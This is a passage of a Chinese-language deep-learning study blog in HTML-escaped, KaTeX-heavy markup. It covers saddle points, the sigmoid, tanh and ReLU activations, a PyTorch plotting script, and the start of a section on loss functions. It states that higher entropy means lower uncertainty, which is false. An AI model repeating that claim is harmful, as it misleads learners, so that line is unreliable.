class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.79444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;α&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;比局部最小值更可怕的问题是鞍点的情况，比如一个二维的函数，很可能出现一种情况，就是某个点是其中一个维度的极小值，但却是另一个维度的极大值。那么对于多维的函数来说这种情况是很常见的 。&lt;/p&gt;
&lt;h4 id=&#34;31-影响优化器的性能的因素&#34;&gt;3.1 影响优化器的性能的因素&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;初始化状态&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;学习率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;逃离局部最小值的方法&lt;/p&gt;
&lt;p&gt;给出一个惯性，也就是当找到极小值点的时候根据惯性继续向前，有可能会逃离出极小值点&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;4-激活函数&#34;&gt;4. 激活函数&lt;/h3&gt;
&lt;p&gt;为了将线性函数转换为非线性函数和方便求导，通常要在神经元的末尾加上激活函数。&lt;/p&gt;
&lt;h4 id=&#34;41-sigmoid&#34;&gt;4.1 sigmoid&lt;/h4&gt;
&lt;p&gt;sigmoid会将值压缩到(0,1)区间，同时导数非常容易求解：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;σ&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;σ&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;σ&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sigma&amp;#x27; = \sigma(1-\sigma)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.801892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;σ&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.801892em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;σ&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;σ&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554534332.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.sigmoid()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;42-tanh&#34;&gt;4.2 tanh&lt;/h4&gt;
&lt;p&gt;tanh是由sigmoid变换而来的，导数：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tanh&amp;#x27; = 1-tanh^2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.801892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.801892em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.72777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8641079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554544273.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.tanh()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;43-relu&#34;&gt;4.3 ReLU&lt;/h4&gt;
&lt;p&gt;ReLU是非常适合现在深度学习的，导数计算起来非常简单，当x&amp;lt;0时，梯度=0，当x&amp;gt;0时，梯度=1，不会出现放大和缩小的情况，很难出现梯度弥散和梯度保障的情况&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554553797.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.relu()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;优先使用ReLU函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch
import torch.nn.functional as F
from torch.autograd import Variable

x = torch.linspace(-5, 5, 200)
x = Variable(x)

x_np = x.data.numpy()

y_relu = F.relu(x).data.numpy()
y_sigmoid = F.sigmoid(x).data.numpy()
y_tanh = F.tanh(x).data.numpy()
y_softplus = F.softplus(x).data.numpy()

import matplotlib.pyplot as plt  # python 的可视化模块, 我有教程 (https://mofanpy.com/tutorials/data-manipulation/plt/)

plt.figure(1, figsize=(8, 6))
plt.subplot(221)
plt.plot(x_np, y_relu, c=&#39;red&#39;, label=&#39;relu&#39;)
plt.ylim((-1, 5))
plt.legend(loc=&#39;best&#39;)

plt.subplot(222)
plt.plot(x_np, y_sigmoid, c=&#39;red&#39;, label=&#39;sigmoid&#39;)
plt.ylim((-0.2, 1.2))
plt.legend(loc=&#39;best&#39;)

plt.subplot(223)
plt.plot(x_np, y_tanh, c=&#39;red&#39;, label=&#39;tanh&#39;)
plt.ylim((-1.2, 1.2))
plt.legend(loc=&#39;best&#39;)

plt.subplot(224)
plt.plot(x_np, y_softplus, c=&#39;red&#39;, label=&#39;softplus&#39;)
plt.ylim((-0.2, 6))
plt.legend(loc=&#39;best&#39;)

plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554565183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5-损失函数loss&#34;&gt;5. 损失函数Loss&lt;/h3&gt;
&lt;p&gt;损失函数分为两大类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Mean Squared Error均方差&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mover accent=&#34;true&#34;&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;ˉ&lt;/mo&gt;&lt;/mover&gt;&lt;msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;MSE = \sum(y-\bar y)^2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;∑&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1141079999999999em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord accent&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.56778em;&#34;&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;accent-body&#34; style=&#34;left:-0.19444em;&#34;&gt;ˉ&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.19444em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cross Entropy Loss&lt;/p&gt;
&lt;p&gt;Entropy熵，熵越高，不确定性uncertainty越小，也就是越稳定的状态。&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Entropy = -\sum p(x)log p(x) \\
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;∑&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;交叉熵就是两个不同的分布，定义为：&lt;/p&gt;
